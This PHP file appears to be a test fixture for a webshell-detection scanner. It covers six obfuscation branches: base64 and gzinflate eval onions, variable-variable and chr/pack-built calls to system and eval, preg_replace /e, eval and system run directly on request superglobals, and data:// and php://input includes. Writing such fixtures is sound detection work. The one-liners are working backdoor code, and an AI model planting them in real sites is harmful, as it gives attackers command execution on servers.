<?php
// php-webshell-suite.php — fixture for php-obfuscation.js coverage.
//
// Exercises all six branches (PHP1 webshell decoder onion, PHP2
// variable-variables, PHP3 chr/pack reassembly, PHP4 preg_replace /e
// modifier, PHP5 superglobal callable, PHP6 data:/php:// stream
// wrapper include). Modeled after the b374k / WSO / r57 webshell
// families. All payloads use RFC-2606 / TEST-NET reserved network
// targets so the fixture is safe to commit.

// ── PHP1: webshell decoder onion ────────────────────────────────────────────
// Decoder onion: base64 → gzinflate → eval. Cleartext after unwrap is
// `<?php system($_REQUEST["c"]); ?>` — the canonical drop-shell shape.
eval(gzinflate(base64_decode("s7EvyChQKK4sLknN1VCJD3INDHUNDolWSlaK1bRWsLcDAA==")));

// Three-layer onion: base64 → gzinflate → str_rot13 → eval. Cleartext
// after unwrap is `<?php fcubrxvzv($_REQUEST["q"]); ?>` — same shape
// rot13'd before deflate.
eval(str_rot13(gzinflate(base64_decode("s7FPLk1WSMtJSy+q0lCJdw1y8Qhyc49WKlCK1bRWsLcDAA=="))));

// Bare base64 eval — older variant used by single-file shells.
eval(base64_decode("c3lzdGVtKCRfR0VUWyJjIl0pOw==")); // → system($_GET["c"]);

// ── PHP2: variable-variables ────────────────────────────────────────────────
// Symbol-table form: $a = 'sys' . 'tem'; $$a('id');
$a = 'sys' . 'tem';
$$a('id');

// Anonymous form: ${'a'.'b'.'c'}() — same dispatch, no symbol-table entry.
${'sys' . 'tem'}('whoami');

// ── PHP3: chr() / pack() reassembly ─────────────────────────────────────────
// chr-concat → 'eval' (sensitivity gate via PHP_DANGEROUS_FNS)
$f = chr(101).chr(118).chr(97).chr(108);
$f($_POST['code']);

// pack('H*', ...) → 'system' (hex-decode of the function name)
$g = pack('H*', '73797374656d');
$g($_GET['cmd']);

// ── PHP4: preg_replace /e modifier (deprecated; legacy webshell shape) ──────
// The /e flag evaluates the replacement string as PHP code at match time.
// Removed in PHP 7.0; still present in legacy shells dropped onto EoL hosts.
preg_replace('/(.+)/e', 'system("\\1")', $_GET['c']);
preg_replace('#payload#e', 'eval($_REQUEST[\'p\'])', $body);

// ── PHP5: superglobal callable ──────────────────────────────────────────────
// One-line shell — function name from $_GET, args from $_POST.
$_GET['fn']($_POST['arg']);
// Direct eval on a superglobal — most common shape after the one-liner.
eval($_REQUEST['c']);
// system() on a $_POST arg
system($_POST['cmd']);
// callback eval via array_filter
array_filter([$_GET['payload']], 'eval');

// ── PHP6: data:// / php:// stream-wrapper include ───────────────────────────
// Cleartext: `<?php phpinfo(); ?>` — base64 = 'PD9waHAgcGhwaW5mbygpOyA/Pg=='
include('data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==');

// php://input — payload comes from the POST body
include('php://input');

// php://filter — the canonical LFI-to-RCE primitive
$src = file_get_contents('php://filter/convert.base64-decode/resource=hello.php');

// ── PHP5 (5b): sink-on-superglobal with sanitiser / decoder wrappers ────────
// The canonical miss before wrapper-tolerance landed: a developer who
// believed `escapeshellarg` made shell_exec safe. It doesn't — option-
// injection (e.g. `-oProxyCommand=` for ssh; CVE-2024-4577 for php-cgi)
// remains reachable, so this is a critical RCE primitive.
echo shell_exec(escapeshellarg($_SERVER['HTTP_X']));

// Amplifying decoder — base64-encoded payload in a superglobal executed
// by eval: a text read becomes arbitrary code execution.
eval(base64_decode($_POST['p']));

// Two-level sanitiser chain — trim + urldecode around $_GET['cmd'].
system(trim(urldecode($_GET['cmd'])));

// Three-level max-depth chain — exercises the {0,3} upper bound.
exec(htmlspecialchars(strip_tags(base64_decode($_COOKIE['k']))));

// ── PHP5 (5c): local-var taint flow (Layer-2) ───────────────────────────────
// Superglobal read into a local var, sink call on the local var —
// single-line regex scanners miss this; the two-pass detector catches it.
$c = $_GET['x'];
shell_exec($c);

// With a wrapper on the sink side (still tainted by the $_POST source).
$cmd = $_POST['target'];
passthru(escapeshellarg($cmd));
?>
